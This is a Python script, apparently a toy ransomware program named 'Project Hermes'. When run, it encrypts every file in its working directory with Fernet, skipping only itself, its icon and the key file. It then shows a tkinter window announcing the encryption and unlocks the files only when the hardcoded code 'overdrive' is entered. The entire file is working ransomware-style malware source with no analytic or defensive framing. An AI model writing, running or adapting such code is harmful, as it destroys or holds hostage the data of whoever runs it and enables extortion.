from tkinter import *
import os
from cryptography.fernet import Fernet
import time

def undo():
    files = []
    for file in os.listdir():
        if file == "thekey.key" or file == "hermes.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    with open("thekey.key", "rb") as thekey:
        secretkey = thekey.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypt = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypt)


def confirm():
    val = input.get()
    if val == "overdrive":
        undo()
        my_label.config(text="Decrypted")
        my_label.config(fg="green")
        window.destroy()
    else:
        my_label.config(text="You're going to have to try harder than that.")
        my_label.config(fg="red")

def encrypt():
    files = []
    for file in os.listdir():
        if file =="hermes.ico" or file == "thekey.key" or file == "hermes.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypt = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypt)
try:
    undo()
    encrypt()
except:
    encrypt()
window = Tk()
window.title("Project Hermes")
window.minsize(width=500, height=300)
window.config(padx=100, pady=200)

# Label
my_label = Label(text="I Am a Label", font=("Arial", 24, "bold"))
my_label.config(
    text="Your files have been encrypted, enter the code to decrypt")
my_label.pack()
my_label.config(padx=50, pady=50)

# Entry
input = Entry(width=10)
print(input.get())
input.pack()

# Button
button = Button(text="Check", command=confirm)
button.pack()

window.mainloop()
